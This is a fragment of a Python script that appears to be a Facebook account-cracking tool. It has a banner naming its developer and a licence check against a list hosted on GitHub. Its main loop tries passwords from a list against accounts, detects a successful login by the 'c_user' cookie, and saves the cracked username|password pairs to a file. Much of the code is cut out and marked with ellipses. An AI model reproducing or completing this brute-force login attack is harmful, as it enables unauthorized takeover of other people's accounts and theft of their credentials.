...
\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            MD RAKIB HOSSEN 
     \033[1;91m➣ \033[1;91mFACEBOOK   :            MD RAKIB HOSSEN 
     \033[1;92m➣ \033[1;92mWHATSAPP   :            0531382117
     \033[1;91m➣ \033[1;91mGITHUB     :            MARKRQKIB-404
...
a=requests.get("https://github.com/MarkZuke-404/promax/blob/main/appro.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    print(yellow+"\n\t\tContact Admin ")
    os.system('xdg-open https://www.facebook.com/profile.php?id=100000433975917 ')
    exit()
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [Mark-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Mark_CP.txt' , 'a').write('%s\n' % wrt)
                        break
